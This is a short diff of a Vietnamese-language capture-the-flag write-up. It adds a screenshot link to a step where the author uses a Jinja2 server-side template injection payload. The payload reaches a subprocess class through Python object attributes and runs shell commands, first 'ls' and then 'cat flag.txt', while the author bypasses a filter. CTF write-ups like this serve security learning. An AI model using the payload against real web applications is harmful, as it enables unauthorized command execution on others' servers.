@@ -26,6 +26,7 @@ thành
 
 - Payload mới: `{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}`
 - Và ok nó hoạt động tốt
+![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/2883ff9a-261d-4332-81c6-937c70020427)
 - Bây giờ sửa lại payload từ `ls` sang `cat flag.txt` thôi
 - ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/28f86e01-25e7-4e51-8e67-9e53225a5f43)
 - Và không nó vẫn bị chặn cái gì nên mình sử dụng cách này bypass filter
